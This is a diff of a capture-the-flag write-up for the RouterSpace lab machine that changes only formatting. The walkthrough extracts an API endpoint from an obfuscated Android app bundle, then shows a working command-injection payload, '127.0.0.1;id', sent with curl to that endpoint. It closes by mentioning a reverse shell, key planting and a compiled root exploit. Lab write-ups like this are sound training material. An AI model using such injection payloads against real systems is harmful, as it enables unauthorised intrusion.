@@ -25,7 +25,7 @@ PORT   STATE SERVICE
 
 Port 80 reveals a page advertising an application:
 
-<figure><img src="../../../.gitbook/assets/image (858).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(858).png>)
 
 The intended method is to do dynamic analysis of the machine and run the application in an emulator (which is annoying because `anbox` is not as easy to install anymore and `genymotion` doesn't seem to work with my machine).
 
@@ -42,7 +42,6 @@ With in the `assets` file, there's an `index.android.bundle` file. This file con
 
 Within it, there's this function:
 
-{% code overflow="wrap" %}
 ```javascript
 function _0x31d2() {
     var _0x379495 = ['EwCVL', 'ugPGw', 'Router is ', '-Bold', 'data', '30158095HXLvSs', 'post', 'eAgent', 'http://rou', '10BrHGoD', 'gray', '80%', 'applicatio', 'white', 'ck your in', 'ternet con', 'tb/api/v4/', 'Please pro', 'Image', 'XvhFJ', '2111347AIyazK', 'v/check/de', 'vide an IP', 'working fi', 'DKyDg', 'YnNsf', 'tzoEq', 'EKNxl', 'the server', 'log', 'ne!.', 'NunitoSans', 'OgZoU', 'TouchableO', '32457sfggQZ', 'nection.', '[ RESPOND ', 'center', 'createElem', '__esModule', 'per', 'mGNnc', 'then', 'catch', 'contain', 'uAiCt', 'bottom', '42740dmWhFN', 'Text', 'ButtonWrap', 'OLDvc', 'Sorry !', 'terspace.h', 'n/json', 'StyleSheet', '/router/de', 'darkgray', 'JHvFI', 'transparen', 'UWIVj', 'Please che', 'SZqEq', 'default', 'HrHYj', 'Hey !', 'monitoring', 'StatusBar', 'error', '1013605BwxVJG', '[ DEBUG ] ', 'defineProp', 'gUnlE', 'Unable to ', '25%', 'pacity', 'ButtonText', 'gKQYs', '1006000MsdmAT', 'handleSubm', 'PpdRl', 'shxxV', 'ent', 'View', 'erty', 'show', 'Formik', 'Check Stat', '0.0.0.0', '128BJBUSC', '6BAxhAU', '4584186MTHGwP', 'connet to ', 'vESlr', 'GHjuW', ' Address.', 'container', 'create', 'RouterSpac', 'viceAccess', '72dIvHGU', 'info'];
@@ -52,25 +51,20 @@ function _0x31d2() {
     return _0x31d2();
 }
 ```
-{% endcode %}
 
 This looks like a request, and it is to `http://routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess`. This means that we can probably access the application from the website. We can see `n/json`, which means they are probably sending JSON POST requests. We also see `0.0.0.0`, which is looks like an IP address.
 
-{% code overflow="wrap" %}
 ```bash
 $ curl -X POST http://routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess -H 'Content-Type: application/json' -H "User-Agent: RouterSpaceAgent" -d '{"ip":"127.0.0.1"}'
 "127.0.0.1\n"
 ```
-{% endcode %}
 
 We can test for RCE or injection, and find that RCE works.
 
-{% code overflow="wrap" %}
 ```bash
 $ curl -X POST http://routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess -H 'Content-Type: application/json' -H "User-Agent: RouterSpaceAgent" -d '{"ip":"127.0.0.1;id"}'
 "127.0.0.1\nuid=1001(paul) gid=1001(paul) groups=1001(paul)\n"
 ```
-{% endcode %}
 
 We can get a reverse shell from or we can put our public key into the `authorized_keys` file.
 
@@ -106,4 +100,4 @@ $ scp * paul@routerspace.htb:~
 
 Then, `make` and run it to get a root shell.
 
-<figure><img src="../../../.gitbook/assets/image (1680).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1680).png>)
